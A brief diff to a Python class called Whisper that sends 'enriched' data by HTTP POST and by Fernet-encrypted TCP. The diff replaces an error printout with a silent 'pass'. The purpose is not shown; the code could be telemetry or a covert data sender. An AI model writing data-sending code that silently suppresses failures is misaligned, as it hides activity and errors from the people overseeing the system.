@@ -111,7 +111,7 @@ class Whisper:
             requests.post(self.http_url, json=enriched_data)
 
         except Exception as e:
-            print(f"Error sending data: {e}")
+            pass
 
     def __transfer_tcp_data(self, enriched_data):
         encrypted_data = Fernet(self.key).encrypt(enriched_data)
